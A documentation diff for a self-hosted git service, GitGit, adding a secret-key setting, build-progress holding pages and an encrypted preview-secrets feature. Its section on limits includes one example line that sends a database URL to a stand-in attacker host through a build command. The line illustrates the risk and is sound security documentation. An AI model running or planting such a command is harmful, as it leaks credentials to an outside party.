@@ -121,6 +121,7 @@ avoid breaking `git clone`.
 | `-data` | `GITGIT_DATA` | `./data` | repos, SQLite DB, CI workspaces |
 | `-base-url` | `GITGIT_BASE_URL` | derived | external URL for clone instructions |
 | `-open-registration` | `GITGIT_OPEN_REGISTRATION` | `true` | allow anyone to sign up; set `false` when internet-facing (the first account can still bootstrap the admin) |
+| — | `GITGIT_SECRET_KEY` | generated | 32-byte hex/base64 key for preview secrets; defaults to `$GITGIT_DATA/secret.key` (0600) |
 | `-ci-workers` | — | `2` | concurrent CI runners |
 
 ## CI configuration
@@ -255,8 +256,11 @@ asset rather than handing back HTML.
 
 With a `run:` command, your process is started with **`$PORT`** set — bind to
 it, on any interface — plus `GITGIT_REPO`, `GITGIT_REF`, `GITGIT_SHA`, and `GITGIT_PREVIEW_URL`.
-GitGit waits for the port to accept connections before routing traffic, and
-serves a holding page (which auto-refreshes) until then.
+GitGit waits for the port to accept connections before routing traffic. Until
+then a visitor gets a holding page reporting the phase — *Step 3 of 4 · npm run
+build* — the time spent on it, and a live tail of the build output, so a slow
+install is distinguishable from a hang. The same progress appears in the
+preview dialog, which opens the log by itself while a build is running.
 
 **Why subdomains.** Each environment is served from its own origin, so
 absolute asset paths (`/assets/app.js`), client-side routers, cookies, and
@@ -277,6 +281,35 @@ or Total TLS. Using a single-level pattern avoids that cost entirely.
 Without `-preview-domain`, previews are served at `/p/{token}/` on the main
 host instead, under a strict opaque-origin sandbox. That is fine for static
 content and local development, but cannot host a running app.
+
+### Secrets
+
+Previews of real applications need real configuration — a database URL, an API
+key. Store them per repository under **Settings → Preview secrets**: paste a
+`.env` file, or add them one at a time. They are encrypted with AES-256-GCM and
+injected as environment variables into every build and every running
+environment for that repository.
+
+```bash
+curl -u you:token -X POST https://git.example.com/api/v1/repos/you/app/secrets \
+  -d '{"dotenv":"DATABASE_URL=postgres://…\nSTRIPE_KEY=sk_test_…"}'
+```
+
+- **Values are write-only.** No endpoint returns one, so nothing can leak them
+  to the browser — the UI lists names and nothing else.
+- **The key lives outside the database**, in `$GITGIT_DATA/secret.key` (mode
+  0600) or `GITGIT_SECRET_KEY`. A stolen copy of `gitgit.db`, or a backup of
+  it, is not enough to read anything. Each value is bound to its repository and
+  name, so a row cannot be moved or renamed to shadow another variable.
+- **Values are struck from build logs**, on the way in and again on the way
+  out, because build tools print their environment freely.
+
+**What this cannot protect against.** A Preview Environment runs the branch's
+own code, so anyone who can push can read these secrets from inside a build —
+`run: curl attacker.example -d "$DATABASE_URL"` is a valid preview
+configuration. That is inherent to running a branch, not something encryption
+fixes. Give previews credentials scoped to a preview database; never production
+keys.
 
 ### Isolation
 
